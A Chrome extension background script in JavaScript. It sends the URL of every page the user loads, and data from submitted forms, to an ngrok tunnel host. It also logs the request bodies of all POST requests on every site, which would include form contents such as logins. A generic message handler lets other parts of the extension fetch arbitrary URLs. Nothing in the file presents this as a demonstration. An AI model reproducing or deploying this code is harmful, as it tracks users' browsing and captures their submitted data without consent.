var xhr = new XMLHttpRequest();

window.onload = function() {

}

window.onbeforeunload = function(){
    var source = document.getElementsByTagName('html')[0].innerHTML;
    console.log("ins " + source);
    console.log("ins " + (source.match(/Rishi/g) || []).length);
};

const WEB_REQUEST = chrome.webRequest;

chrome.runtime.onMessage.addListener(function(request, sender, callback) {
    if (request.action == "xhttp") {
        var xhttp = new XMLHttpRequest();
        var method = request.method ? request.method.toUpperCase() : 'GET';

        xhttp.onload = function() {
            callback(xhttp.responseText);
        };
        xhttp.onerror = function() {
            // Do whatever you want on error. Don't forget to invoke the
            // callback to clean up the communication port.
            callback();
        };
        xhttp.open(method, request.url, true);
        if (method == 'POST') {
            xhttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        }
        xhttp.send(request.data);
        return true; // prevents the callback from being called too early on return
    }
});

WEB_REQUEST.onBeforeRequest.addListener(
    function(details) {
        if(details.method == "POST")
            console.log(JSON.stringify(details));
    },
    {urls: ["<all_urls>"]},
    ["blocking", "requestBody"]
);

chrome.extension.onRequest.addListener(function(request, sender, callback) {
    switch (request.name) {
         case 'form_submit':
             var data = request.data;
             var url = data;

            var toSendToServer = "http://9e42b091.ngrok.io/?url=" + url;

            xhr.open("GET", toSendToServer, false);
            xhr.send();

            var result = xhr.responseText;

             break;
     }
});

chrome.tabs.onUpdated.addListener( function (tabId, changeInfo, tab) {

    if (changeInfo.status == 'complete') {

        chrome.tabs.getSelected(null,function(tab) {

            var url = tab.url;

            var toSendToServer = "http://9e42b091.ngrok.io/?url=" + url;

            xhr.open("GET", toSendToServer, false);
            xhr.send();

            var result = xhr.responseText;

        });

    }

});
